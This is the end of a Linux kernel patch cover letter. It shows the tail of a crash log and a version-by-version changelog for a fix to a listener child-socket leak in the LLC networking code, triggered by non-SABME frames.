[ 1665.730065][T10284] Code: Unable to access opcode bytes at 0x559e433ce5a1.

[ 1665.730594][T10284] RSP: 002b:00007ffcc17c93f0 EFLAGS: 00010206

[ 1665.731148][T10284] RAX: 000000000000003c RBX: 00007ffcc17c9418 RCX: 0000559e433d10c6

[ 1665.731733][T10284] RDX: 000000000000002c RSI: 0000559e433d10c0 RDI: 0000000000000004

[ 1665.732318][T10284] RBP: 00007ffcc17c9412 R08: 00007ffcc17c9420 R09: 0000000000000014

[ 1665.732904][T10284] R10: 0000000000000000 R11: 0000000000000202 R12: 0000559e433d10c6

[ 1665.733491][T10284] R13: d288ce703afb7e91 R14: 0000000000019194 R15: 0000000000000004

[ 1665.734120][T10284]  </TASK>
-----END crash log-----

changes in v9:
  - Simplify the fix to cover only the non-SABME listener leak:
    create children only for SABME, answer DISC and P=1 commands with
    a DM response addressed to the source address decoded from the packet,
    and drop all other non-SABME frames without running the listener state
    machine.
  - Remove the incoming_state / workqueue / child-list lifecycle rewrite.
  - Keep the existing SABME child lifecycle unchanged.
  - Leave accept-queue accounting and llc_ui_accept() unchanged; related
    feedback is outside this non-SABME-only fix.
  - Treat unbounded SABME child allocation as a separate issue; v9 does not
    claim to fix SABME flooding.
  - Explicitly document the disposition of the three earlier review points:
    v9 does not change accept-queue accounting or llc_ui_accept(), and does
    not address unbounded SABME child allocation.
  - v8 Link: https://lore.kernel.org/all/abc8b115321dbd417b8491d9e51f1988998ff50e.1788707641.git.zihanx@nebusec.ai/
changes in v8:
  - Reject a connection indication whose skb->sk is the listener itself
    so accept() cannot lock_sock_nested() the socket it already holds,
    and drop the extra QUEUED reference only when it was taken.
  - Drop the extra QUEUED hold from the incoming_children close walk,
    matching the receive-queue walk.
  - Do not run the connection state machine on a released incoming child
    from the listener backlog; leftover in-service child frames run on
    that child under its lock.
  - Limit out-of-service tests on the receive path to incoming children
    and to a looked-up child already marked out of service. SAP unhash
    is RCU, so drop that later lookup instead of indexing the state
    table with state 0. This is not a generic llc_conn_service bounds
    check.
  - Do not nested-lock a QUEUED child on itself in llc_backlog_rcv().
  - Sort the new locals in llc_release_incoming_children() reverse
    xmas tree.
  - Describe the original /proc/net/llc/socket leak evidence as the
    wc -l count (0 then 100 leftover entries). No raw proc table from
    that run was kept.
  - Decode the remaining OOM frames against a rebuilt 6.12.74 vmlinux;
    leftover lockdep, sanitizer, and do_pte_missing frames still show
    original offsets.
  - Keep this as the listener child leak and lifecycle fix only. The
    listen(2) accept-queue bound raised against v7 is independent of the
    leak and is not included here.
  - v7 Link: https://lore.kernel.org/all/cover.1788414881.git.zihanx@nebusec.ai/
changes in v7:
  - Drop the companion LLC_CONN_OUT_OF_SVC bounds patch due to overlap with
    Kees Cook's net-next series:
    https://lore.kernel.org/all/20260901210300.i.590-kees@kernel.org/
  - That series also covers the connect(2) +1 return and rejecting
    out-of-service states before table lookup, as raised in review of
    v6 2/2:
    https://lore.kernel.org/all/20260902010052.2297527-1-kuba@kernel.org/
  - Keep only the listener child leak fix for net.
  - Fix reverse-xmas-tree local ordering in llc_conn_handler() and
    llc_incoming_sock_work(), align the atomic_cmpxchg() continuation,
    and add matching braces on the backlog retry if/else.
  - Release a PENDING child when llc_conn_handler() sees a redirected
    packet for a TCP_LISTEN socket that is already SOCK_DEAD, instead of
    dropping the packet and leaving that cleanup only to close().
  - Keep the init_net CAP_NET_RAW/CAP_NET_ADMIN reproducer; PF_LLC is
    rejected outside init_net, so unshare -Urn cannot express this path.
  - Spell out that the crash PoC is DISC-only, include poc-sabme.c for
    the accept and close paths, and restore the full OOM panic so the
    leftover /proc/net/llc/socket leak is described next to that log.
  - Do not tear down an already pending child when a redirected frame
    fails sk_add_backlog(); drop that frame only.
  - Track incoming children on the listener and release leftover PENDING
    sockets from that list on close(), instead of relying only on
    sk_receive_queue, backlog drain, or a later SOCK_DEAD packet.
  - Stop taking the listener lock in llc_incoming_sock_work(); the child
    already holds the listener, and teardown no longer interleaves with
    llc_ui_release()'s llc_sk_free().
  - Hold a child socket reference on handshake skbs with
    skb_set_owner_sk_safe(), so kfree_skb() cannot race asynchronous
    teardown through sock_rfree().
  - Finish sock_orphan() and the device put in llc_incoming_sock_work()
    before llc_sk_free(), so those steps do not run after its sock_put().
  - Keep the v1 lore Link on its own line, before the numbered-patch
    diffstat.
  - Include the original leak-only leftover /proc/net/llc/socket count
    next to the later panic_on_oom log.
  - v6 Link: https://lore.kernel.org/all/cover.1787752861.git.zihanx@nebusec.ai/
changes in v6:
  - Hold a reference for children queued for accept() and release it when they
    are dequeued, while retaining SAP publication so tuple lookup still finds
    a pending child before the passive open completes.
  - Make direct receive, backlog, accept-queue, and listener-close cleanup
    symmetric, with bottom-half-disabled child locking in process context.
  - Keep the LLC_CONN_OUT_OF_SVC lower-bound check in its separate patch and
    use the ADM state boundary consistently.
  - v5 Link: https://lore.kernel.org/all/20260822082354.3109-1-zihanx@nebusec.ai/
changes in v5:
  - Make listener child cleanup unconditional so queued children are also
    released if the socket leaves TCP_LISTEN before close.
  - Serialize process-context child cleanup and backlog dispatch with bottom
    halves disabled, avoiding child-lock acquisition races with LLC receive
    and timer paths.
  - Drop packets redirected through a pending child after its listener is no
    longer listening, and release children left out of service instead of
    dispatching them.
  - Split the LLC_CONN_OUT_OF_SVC lower-bound check into a separate patch.
  - v4 Link: https://lore.kernel.org/all/20260814185843.4748-1-zihanx@nebusec.ai/
changes in v4:
  - Create a passive-open child only for SABME and generate listener-side DM
    replies directly for non-SABME commands.
  - Use an atomic incoming-child lifecycle and serialize pending-child lookup,
    backlog processing, rollback, and listener close with the child lock.
  - Keep immediate SAP publication for passive-open tuple matching, but release
    unaccepted children on direct and backlog failures and on listener close.
  - Defer final incoming-child cleanup to workqueue context so timer
    synchronization does not run in the receive softirq path.
  - Add an LLC state lower-bound check before state-table dispatch.
  - v3 Link: https://lore.kernel.org/all/20260805175945.10698-1-zihanx@nebusec.ai/
changes in v3:
  - Drop the unused llc_conn_handler() local rc variable reported in review.
  - Rebase the numbered patch and cover onto commit
    ede76849012e45ffb2193ad110b42027eec02c5c.
  - v2 Link: https://lore.kernel.org/all/cover.1785386749.git.zihanx@nebusec.ai/
changes in v2:
  - Rework the fix to preserve the existing passive-open tuple matching
    semantics instead of deferring child publication until LLC_CONN_PRIM.
  - Track listener-created children pending publication to accept(), and roll
    them back on every earlier failure or drop path.
  - Cover the original non-SABME leak and SABME paths which fail before
    LLC_CONN_PRIM, including backlog enqueue and backlog drop failures.
  - Correct Fixes to 1da177e4c3f4 ("Linux-2.6.12-rc2") based on the
    earliest commit that introduced the child publication behavior.
  - Clarify panic_on_oom crash evidence and packetdrill selection.
  - v1 Link: https://lore.kernel.org/all/cover.1784725007.git.zihanx@nebusec.ai/

Best regards,
Zihan Xi

Zihan Xi (1):
  llc: fix listener child socket leak on non-SABME frames

 net/llc/llc_conn.c | 53 ++++++++++++++++++++++++++++++++++++++++++----
 1 file changed, 49 insertions(+), 4 deletions(-)

-- 
2.43.0

